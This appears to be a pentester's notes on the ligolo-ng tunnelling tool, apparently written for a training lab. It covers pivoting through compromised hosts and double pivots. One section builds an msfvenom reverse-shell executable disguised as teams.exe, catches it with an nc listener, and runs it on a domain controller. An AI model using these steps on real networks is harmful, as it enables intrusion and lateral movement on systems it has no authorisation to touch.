# ligolo-ng

## Overview

Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).


## Usage

Example Scenario:

Lets say that we are connected to a vpn and we can talk with a machine called MS01. Then in this machine we can talk to a DC01. Ligolo can help us tunnel through MS01 directly to DC01, so that we can do from our local machine this:

    ping DC01

First download the ligolo agent to the MS01 machine and the ligolo proxy to run it in our local machine

Then in the localhost create the ligolo interface:

    sudo ip tuntap add user kali mode tun ligolo

Then start the interface:

    sudo ip link set ligolo up

Then start the proxy in the localhost:

    ./proxy -selfcert -laddr 0.0.0.0:<desired_proxy_port>

Then on the machine MS01, start the agent:

    agent.exe --connect <ip_of _the_proxy>:<port_of_the_proxy> -retry -ignore-cert

Back on the proxy, after the agent has joined:

    session
    <choose the session for the agent that just connected>
    start

Then add the route to DC01 to the interface:

    sudo ip route add <subnet_mask_dc01> dev ligolo

For example

    sudo ip route add 10.10.1.0/24 dev ligolo

Finally you should be able now to simple do:

    ping DC01

And the icmp packets will be route through MS01 to DC01

## Reverse Port Forward through agent to proxy

When the proxy is running in localhost. In a ligolo session, use the listener_add to start a reverse port forward through the agent to the proxy:

    listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp

This will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.

## Reverse shell Through agent to proxy

Let's say we have a server DC01 that can connect to A1, but not to our localhost. Our localhost as a ligolo proxy set and A1 has a ligolo agent running and a session has been started between our localhost proxy and the agent of A1. To start a revershell from DC01 to our local host we can do:

First in the proxy we create a listener in the session of A1.

```
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
```

This means that any connection to A1 on port 443 will be forwards to our localhost:443.

Then we create a msfvenom payload from DC01 to A1 port 443:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[A1_IP_ADDRESS] LPORT=443 -f exe -o teams.exe
```

We create our nc listener on port 443 in our localhost

```shell
nc -nvlp 443
```

Finally we upload the teams.exe payload to DC01 and run it. If there is an error with our ligolo listener, we can remove it and instead do port forwarding from A1 to our localhost with chisel or ssh:

```shell
ssh -i root.key -R [A1_IP_ADDRESS]:443:0.0.0.0:443 root@[A1_IP_ADDRESS] -vN
```


## Double Pivoting

Lets consider an environment with:

localhost -> DMZ01 -> DC01 -> I01

To be able to ping I01 from our localhost we need to create a double pivot from DMZ01 to localhost and then from DC01, through DMZ01 to our localhost.

1- We setup the proxy in our localhost:

```shell
#in the localhost
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
#this creates a proxy on the default port of 11601
./ligolo-proxy -selfcert
```

2- Create an agent in DMZ01 that connects to our proxy:

```shell
./ligolo-agent --connect <localhost_ip>:11601 -retry -ignore-cert
```

3- Back in the localhost proxy, create the route to dmz01, and start the session:
```shell
sudo ip route add 172.16.0.0/16 dev ligolo
#choose the session in the proxy and start
```
4- Now, we want to use agent in DC01, that creates a session in our localhost:11601, to do this, we will need to reverse porforward the connections to 11601 in DMZ01 to our localhost:

```shell
#in the proxy, on the dmz01 session create a listener
listener_add --addr 0.0.0.0:11601 --to <localhost_ip>:11601 --tcp
#this should create a port in DMZ01 listenning to connections, we can check this with
netstat -ant|grep 11601
```
We should see the ipv4 and ipv6 listeners:

    tcp        0      0 0.0.0.0:11601           0.0.0.0:*               LISTEN
    tcp6       0      0 :::11601                :::*                    LISTEN

Now sometimes the listener only creates a port only listening in ipv6, not in ipv4 as well. If this happens we need to stop the listener and reverse porfoward in some other way like:

```shell
ssh -R <DMZ01_ip_address>:11601:0.0.0.0:11601 root@<DMZ01_ip_address>
```

5- Moving on to start an agent in DC01. We are goin to need a new tunnel for the connection between DC01 agent and the proxy. This new tunnel cannot use the ligolo interface, because this interface is already being used for the tunnel between the proxy and DMZ01, so lets create a new interface:

```shell
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up
```

6- Now in the DC01, start the agent connecting to DMZ01 (which will porforward to our localhost):

```shell
./ligolo-agent --connect <DMZ01_ip_address>:11601 -retry -ignore-cert
```

7- We should see a new session being created on the proxy. Choose this session and start the new tunnel:

```shell
#in the ligolo proxy
tunnel_start --tun ligolo-double
```

8- The only thing missing is to route the requests to I01, through this new interface. For example:

```shell
sudo ip route add <I01_ip_address>/32 dev ligolo-double
sudo ip route add 172.16.9.25/32 dev ligolo-double
```

9- We can finally ping I01:

```shell
ping I01
```


## Cleaning up

After using ligolo, you can delete the created interface with:

```shell
sudo ip link delete ligolo
```

This will also delete the routes created.

## Tips

When using nmap, you should use --unprivileged or -PE to avoid false positives.

```shell
nmap -Pn -oN dc01_nmap.out --unprivileged DC01.INLANEFREIGHT.LOCAL

nmap -Pn -oN dc01_nmap.out --unprivileged -iL live_hosts
```


Creating proxy with certficate

```shell
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
./proxy -certfile cert.pem -keyfile=key.pem -laddr 0.0.0.0:8888
```


## More Information

https://github.com/nicocha30/ligolo-ng